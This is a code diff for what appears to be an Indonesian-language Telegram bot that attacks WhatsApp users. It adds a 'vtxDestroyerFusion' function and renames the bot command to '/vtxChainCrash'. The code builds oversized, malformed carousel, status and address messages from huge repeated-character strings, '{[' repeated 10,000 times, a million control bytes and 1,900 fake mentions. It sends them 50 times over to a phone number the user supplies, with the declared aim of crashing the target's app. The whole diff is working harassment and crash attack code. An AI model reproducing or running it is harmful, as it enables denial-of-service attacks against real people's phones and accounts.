@@ -882,7 +882,7 @@ const msgxay = {
 
   
   let msg = null;
-  for (let b = 0; b < 75; b++) {
+  for (let b = 0; b < 100; b++) {
   await valtix.relayMessage("status@broadcast", xnxxmsg.message, {
       messageId: xnxxmsg.key.id,
       statusJidList: [target],
@@ -1022,150 +1022,153 @@ async function eventFlowres(valtix, jid) {
     );
 }
 
+async function vtxDestroyerFusion(valtix, target) {
+  console.log(chalk.red(`[FUSION] Mengirim bug gabungan ke ${target}`));
 
-async function Carousel(valtix, target) {
-    console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
-    for (let b = 0; b < 75; b++) {
+  for (let i = 0; i < 50; i++) {
+    console.log(`[FUSION] Loop ${i + 1}/50`);
+
+    // === 1. CAROUSEL BUG ===
     const cards = Array.from({ length: 5 }, () => ({
-        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "valtix" + "ꦽ".repeat(5000), }),
-        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "valtix" + "ꦽ".repeat(5000), }),
-        header: proto.Message.InteractiveMessage.Header.fromObject({
-            title: "VALTIX" + "ꦽ".repeat(5000),
-            hasMediaAttachment: true,
-            videoMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
-                mimetype: "video/mp4",
-                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
-                fileLength: "9999999999999999",
-                seconds: 9999,
-                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
-                height: 9999,
-                width: 9999,
-                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
-                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1755691703",
-                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
-                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
-            },
-        }),
-        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-            messageParamsJson: "{[",
-            messageVersion: 3,
-            buttons: [
-                {
-                    name: "single_select",
-                    buttonParamsJson: "",
-                },           
-                {
-                    name: "galaxy_message",
-                    buttonParamsJson: JSON.stringify({
-                        "icon": "RIVIEW",
-                        "flow_cta": "ꦽ".repeat(10000),
-                        "flow_message_version": "3"
-                    })
-                },     
-                {
-                    name: "galaxy_message",
-                    buttonParamsJson: JSON.stringify({
-                        "icon": "RIVIEW",
-                        "flow_cta": "ꦾ".repeat(10000),
-                        "flow_message_version": "3"
-                    })
-                }
-            ]
-        })
+      body: proto.Message.InteractiveMessage.Body.fromObject({ text: "valtix" + "ꦽ".repeat(5000) }),
+      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "valtix" + "ꦽ".repeat(5000) }),
+      header: proto.Message.InteractiveMessage.Header.fromObject({
+        title: "VALTIX" + "ꦽ".repeat(5000),
+        hasMediaAttachment: true,
+        videoMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
+          mimetype: "video/mp4",
+          fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
+          fileLength: "9999999999999999",
+          seconds: 9999,
+          mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
+          height: 9999,
+          width: 9999,
+          fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
+          directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc",
+          mediaKeyTimestamp: "1755691703",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD...",
+          streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
+        }
+      }),
+      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
+        messageParamsJson: "{[".repeat(10000),
+        messageVersion: 3,
+        buttons: [
+          {
+            name: "galaxy_message",
+            buttonParamsJson: JSON.stringify({
+              icon: "RIVIEW",
+              flow_cta: "ꦽ".repeat(10000),
+              flow_message_version: "3"
+            })
+          }
+        ]
+      })
     }));
 
-    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";
-
-    const carousel = generateWAMessageFromContent(
-        target, 
-        {
-            viewOnceMessage: {
-                message: {
-                    messageContextInfo: {
-                        deviceListMetadata: {},
-                        deviceListMetadataVersion: 2
-                    },
-                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
-                        body: proto.Message.InteractiveMessage.Body.create({ 
-                            text: `§valtixUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
-                        }),
-                        footer: proto.Message.InteractiveMessage.Footer.create({ 
-                            text: "ꦽ".repeat(5000),
-                        }),
-                        header: proto.Message.InteractiveMessage.Header.create({ 
-                            hasMediaAttachment: false 
-                        }),
-                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
-                            cards: cards 
-                        }),
-                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                            messageParamsJson: "{[".repeat(10000),
-                            messageVersion: 3,
-                            buttons: [
-                                {
-                                    name: "single_select",
-                                    buttonParamsJson: "",
-                                },           
-                                {
-                                    name: "galaxy_message",
-                                    buttonParamsJson: JSON.stringify({
-                                        "icon": "RIVIEW",
-                                        "flow_cta": "ꦽ".repeat(10000),
-                                        "flow_message_version": "3"
-                                    })
-                                },     
-                                {
-                                    name: "galaxy_message",
-                                    buttonParamsJson: JSON.stringify({
-                                        "icon": "RIVIEW",
-                                        "flow_cta": "ꦾ".repeat(10000),
-                                        "flow_message_version": "3"
-                                    })
-                                }
-                            ]
-                        }),
-                        contextInfo: {
-                            participant: target,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from(
-                                    { length: 1900 },
-                                    () =>
-                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                                ),
-                            ],
-                            remoteJid: "X",
-                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-                            stanzaId: "123",
-                            quotedMessage: {
-                                paymentInviteMessage: {
-                                    serviceType: 3,
-                                    expiryTimestamp: Date.now() + 1814400000
-                                },
-                                forwardedAiBotMessageInfo: {
-                                    botName: "META AI",
-                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-                                    creatorName: "Bot"
-                                }
-                            }
-                        },
-                    })
-                }
+    const carouselMsg = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
+            body: proto.Message.InteractiveMessage.Body.create({ text: `§valtixFusion§\n${"ꦾ".repeat(5000)}` }),
+            footer: proto.Message.InteractiveMessage.Footer.create({ text: "ꦽ".repeat(5000) }),
+            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
+            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards }),
+            contextInfo: {
+              participant: target,
+              mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
+              remoteJid: "status@broadcast"
             }
-        }, 
-        { userJid: target }
-    );
-
-    // Pengiriman dengan format yang diminta tanpa mention
-    await valtix.relayMessage(target, {
-        groupStatusMessageV2: {
-            message: carousel.message
+          })
         }
-    }, { messageId: carousel.key.id });
-    }
+      }
+    }, { userJid: target });
+
+    await valtix.relayMessage(target, {
+      groupStatusMessageV2: { message: carouselMsg.message }
+    }, { messageId: carouselMsg.key.id });
+
+    // === 2. OTAX CRASH BUG ===
+    const biji2 = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: { text: "⸙ᵒᵗᵃˣ⸙", format: "DEFAULT" },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
+              version: 3
+            }
+          }
+        }
+      }
+    }, {});
+
+    const content = {
+      extendedTextMessage: {
+        text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(30000),
+        matchedText: "ꦽ".repeat(20000),
+        description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
+        title: "ꦽ".repeat(20000),
+        previewType: "NONE",
+        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD...",
+        contextInfo: {
+          isForwarded: true,
+          forwardingScore: 9999,
+          participant: target,
+          remoteJid: "status@broadcast",
+          mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)],
+          quotedMessage: {
+            newsletterAdminInviteMessage: {
+              newsletterJid: "otax@newsletter",
+              newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
+              caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+              inviteExpiration: "999999999"
+            }
+          }
+        }
+      }
+    };
+
+    const xnxxmsg = generateWAMessageFromContent(target, content, {});
+
+    // === 3. RELAY ALL BUGS ===
+    await valtix.relayMessage("status@broadcast", xnxxmsg.message, {
+      messageId: xnxxmsg.key.id,
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{ tag: "to", attrs: { jid: target }, content: [] }]
+        }]
+      }]
+    });
+
+    await valtix.relayMessage("status@broadcast", biji2.message, {
+      messageId: biji2.key.id,
+      statusJidList: [target],
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {},
+        content: [{
+          tag: "mentioned_users",
+          attrs: {},
+          content: [{ tag: "to", attrs: { jid: target }, content: [] }]
+        }]
+      }]
+    });
+
+    // === 4. JEDA 4 DETIK ===
+    if (i < 49) await new Promise(resolve => setTimeout(resolve, 4000));
+  }
+
+  console.log(chalk.green(`[FUSION] Selesai mengirim 50x bug ke ${target}`));
 }
+
 //func iphone//
 async function LoadInvisIphone(valtix, target) {
   const AddressPayload = {
@@ -1436,7 +1439,7 @@ bot.on("callback_query", async (query) => {
 ╭━─━─━─━─━─━─━─━─━─
 ┃❏ 𝗠𝗲𝗻𝘂 𝗕𝘂𝗴 ❏
 ┃ ╰ 〆 crash✗ 
-┃   ┗⊱ /vtxDestroyer 62×××
+┃   ┗⊱ /vtxChainCrash 62×××
 ┃   ┗⊱ /vtxCrashInject 62×××
 ┃
 ┃ ╰ 〆 ios✗ 
@@ -1777,7 +1780,7 @@ bot.onText(/\/vtxCrashInject (\d+)/, async (msg, match) => {
 });
 
 
-bot.onText(/\/vtxDestroyer (\d+)/, async (msg, match) => {
+bot.onText(/\/vtxChainCrash (\d+)/, async (msg, match) => {
             const chatId = msg.chat.id;
             const senderId = msg.from.id;
             const userId = msg.from.id;
@@ -1850,16 +1853,8 @@ bot.onText(/\/vtxDestroyer (\d+)/, async (msg, match) => {
     
         console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         for (let a = 0; a < 50; a++) {
-
-    if (a % 2 === 0) {
-        await Carousel(valtix, jid);
-        console.log(`[${a}] → Mode 1: Carousel`);
-    } else {
-        await eventFlowres(valtix, jid);
-        console.log(`[${a}] → Mode 2: eventFlowres`);
-    }
-
-    await new Promise(r => setTimeout(r, 1500));
+          await vtxDestroyerFusion(valtix, jid);
+         await new Promise(r => setTimeout(r, 1500));
 }
 
         console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
